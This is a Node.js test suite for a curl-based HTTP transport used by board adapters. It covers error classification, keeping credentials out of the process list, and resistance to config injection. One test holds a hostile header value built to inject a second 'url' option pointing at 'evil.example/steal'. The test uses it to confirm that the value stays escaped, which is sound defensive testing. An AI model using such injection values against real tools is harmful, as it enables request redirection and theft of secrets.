import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { chmodSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { AddressInfo } from 'node:net';
import {
  assertBoardHttpOk,
  boardErrorFromResponse,
  BoardError,
  classifyBoardHttpStatus,
  createCurlRequestFn,
  parseBoardJson,
  requestBoardJson,
  unconfiguredRequestFn,
} from '../index.js';

// The transport seam is shared by every network-backed adapter, so it is tested
// once here — against a REAL local HTTP server (no external network, no token)
// rather than a mock, which is also how we know curl is invoked correctly.

test('classifyBoardHttpStatus: the taxonomy maps statuses onto retryability', () => {
  assert.equal(classifyBoardHttpStatus(401), 'auth');
  assert.equal(classifyBoardHttpStatus(403), 'auth');
  assert.equal(classifyBoardHttpStatus(404), 'not_found');
  assert.equal(classifyBoardHttpStatus(405), 'unsupported');
  assert.equal(classifyBoardHttpStatus(400), 'precondition');
  assert.equal(classifyBoardHttpStatus(409), 'precondition');
  assert.equal(classifyBoardHttpStatus(412), 'precondition');
  assert.equal(classifyBoardHttpStatus(422), 'precondition');
  assert.equal(classifyBoardHttpStatus(429), 'transport');
  assert.equal(classifyBoardHttpStatus(500), 'transport');
  assert.equal(classifyBoardHttpStatus(503), 'transport');
  assert.equal(new BoardError(classifyBoardHttpStatus(429), 'x').retriable, true);
  assert.equal(new BoardError(classifyBoardHttpStatus(403), 'x').retriable, false);
});

test('boardErrorFromResponse / assertBoardHttpOk: non-2xx is classified and truncated', () => {
  const err = boardErrorFromResponse({ status: 404, body: 'not\nfound   here' }, 'getWork', 'T-1');
  assert.equal(err.kind, 'not_found');
  assert.equal(err.item, 'T-1');
  assert.match(err.message, /getWork failed with HTTP 404: not found here/);

  assert.doesNotThrow(() => assertBoardHttpOk({ status: 204, body: '' }, 'x'));
  assert.throws(() => assertBoardHttpOk({ status: 500, body: 'boom' }, 'x'), /HTTP 500/);
});

test('parseBoardJson: a non-JSON body is a transport failure, not a crash', () => {
  assert.deepEqual(parseBoardJson<{ a: number }>({ status: 200, body: '{"a":1}' }, 'x'), { a: 1 });
  assert.throws(() => parseBoardJson({ status: 200, body: '<html>' }, 'x'), (e: unknown) => e instanceof BoardError && e.kind === 'transport');
});

test('requestBoardJson: requires 2xx before parsing', async () => {
  const ok = await requestBoardJson<{ id: string }>(
    async () => ({ status: 200, body: '{"id":"T-1"}' }),
    { method: 'GET', url: 'https://board.example/T-1' },
    'getWork',
  );
  assert.equal(ok.id, 'T-1');
  await assert.rejects(
    () => requestBoardJson(async () => ({ status: 403, body: '{}' }), { method: 'GET', url: 'u' }, 'getWork'),
    (e: unknown) => e instanceof BoardError && e.kind === 'auth',
  );
});

test('unconfiguredRequestFn: fails closed instead of calling out', async () => {
  await assert.rejects(
    () => unconfiguredRequestFn('github')({ method: 'GET', url: 'https://api.github.com/x' }),
    /github: no request transport configured/,
  );
});

test('createCurlRequestFn: real request against a local server (method, headers, body, status)', async () => {
  const seen: Array<{ method?: string; url?: string; token?: string; body: string }> = [];
  const server = createServer((req, res) => {
    let body = '';
    req.on('data', (chunk) => (body += chunk));
    req.on('end', () => {
      seen.push({ method: req.method, url: req.url, token: req.headers['x-test-token'] as string | undefined, body });
      if (req.url === '/fail') {
        res.statusCode = 404;
        res.end('nope');
        return;
      }
      res.setHeader('content-type', 'application/json');
      res.end(JSON.stringify({ ok: true, method: req.method }));
    });
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const port = (server.address() as AddressInfo).port;
  const request = createCurlRequestFn({ headers: () => ({ 'X-Test-Token': 'sekret' }), timeoutSeconds: 10 });

  try {
    const created = await request({
      method: 'POST',
      url: `http://127.0.0.1:${port}/items`,
      body: { title: 'from the contract' },
    });
    assert.equal(created.status, 200);
    assert.deepEqual(JSON.parse(created.body), { ok: true, method: 'POST' });
    assert.equal(seen.length, 1);
    assert.equal(seen[0]?.method, 'POST');
    assert.equal(seen[0]?.token, 'sekret');
    assert.equal(seen[0]?.body, JSON.stringify({ title: 'from the contract' }));

    const failed = await request({ method: 'GET', url: `http://127.0.0.1:${port}/fail` });
    assert.equal(failed.status, 404);
    assert.equal(failed.body, 'nope');
    assert.equal(boardErrorFromResponse(failed, 'getWork').kind, 'not_found');
  } finally {
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
});

test('createCurlRequestFn: credentials never reach the process list — argv stays clean, the config rides on stdin', async () => {
  // `ps` shows argv, so a token passed as `-H "Authorization: Bearer …"` is a
  // local leak. This stub records BOTH what it was called with and what it read
  // on stdin, which is the only way to prove the secret is not in argv.
  const dir = mkdtempSync(join(tmpdir(), 'takumi-curl-stub-'));
  const argvFile = join(dir, 'argv.txt');
  const stdinFile = join(dir, 'stdin.txt');
  const stub = join(dir, 'curl-stub.mjs');
  writeFileSync(
    stub,
    [
      '#!/usr/bin/env node',
      "import { writeFileSync } from 'node:fs';",
      "let input = '';",
      "process.stdin.on('data', (chunk) => (input += chunk));",
      "process.stdin.on('end', () => {",
      `  writeFileSync(${JSON.stringify(argvFile)}, process.argv.slice(2).join(' '));`,
      `  writeFileSync(${JSON.stringify(stdinFile)}, input);`,
      "  process.stdout.write('{\"ok\":true}\\n200');",
      '});',
      '',
    ].join('\n'),
  );
  chmodSync(stub, 0o755);

  const request = createCurlRequestFn({ curlBinary: stub, headers: () => ({ 'X-Secret-Token': 'super-secret-value' }) });
  const res = await request({ method: 'POST', url: 'https://board.example/items', body: { title: 'x' } });
  assert.equal(res.status, 200);
  assert.deepEqual(JSON.parse(res.body), { ok: true });

  const argv = readFileSync(argvFile, 'utf8');
  assert.ok(!argv.includes('super-secret-value'), `the token must never be an argument: ${argv}`);
  assert.ok(!argv.includes('board.example'), 'even the URL travels on stdin');
  assert.match(argv, /-K -/, 'curl reads its config from stdin');

  const config = readFileSync(stdinFile, 'utf8');
  assert.match(config, /^request = "POST"$/m);
  assert.match(config, /^max-time = "30"$/m);
  assert.match(config, /^header = "X-Secret-Token: super-secret-value"$/m);
  assert.match(config, /^header = "Content-Type: application\/json"$/m);
  // The JSON body's quotes are escaped inside the quoted value, so it cannot be
  // mistaken for the end of the string (asserted literally, not as a regex).
  assert.ok(
    config.includes('data-binary = "{\\"title\\":\\"x\\"}"'),
    `the JSON body must stay a single escaped value: ${config}`,
  );
  assert.match(config, /^url = "https:\/\/board\.example\/items"$/m);
});

test('createCurlRequestFn: a value that tries to inject another option stays inside its quotes', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'takumi-curl-inject-'));
  const stdinFile = join(dir, 'stdin.txt');
  const stub = join(dir, 'curl-stub.mjs');
  writeFileSync(
    stub,
    [
      '#!/usr/bin/env node',
      "import { writeFileSync } from 'node:fs';",
      "let input = '';",
      "process.stdin.on('data', (chunk) => (input += chunk));",
      "process.stdin.on('end', () => {",
      `  writeFileSync(${JSON.stringify(stdinFile)}, input);`,
      "  process.stdout.write('ok\\n200');",
      '});',
      '',
    ].join('\n'),
  );
  chmodSync(stub, 0o755);

  const hostile = 'x"\nurl = "https://evil.example/steal';
  const request = createCurlRequestFn({ curlBinary: stub, headers: () => ({ 'X-Test': hostile }) });
  await request({ method: 'GET', url: 'https://board.example/items' });
  const config = readFileSync(stdinFile, 'utf8');
  // One header line only, and the embedded quote/newline are escaped inside it.
  assert.equal(config.split('\n').filter((l) => l.startsWith('header = ')).length, 1);
  assert.match(config, /^header = "X-Test: x\\"\\nurl = \\"https:\/\/evil\.example\/steal"$/m);
  assert.ok(!/^url = "https:\/\/evil/m.test(config), 'the injected url must not become a real option');
});

test('createCurlRequestFn: an unreachable endpoint is a transport error, never a hang', async () => {
  const request = createCurlRequestFn({ timeoutSeconds: 2 });
  await assert.rejects(
    // Port 1 on loopback refuses immediately.
    () => request({ method: 'GET', url: 'http://127.0.0.1:1/x' }),
    (e: unknown) => e instanceof BoardError && e.kind === 'transport',
  );
});
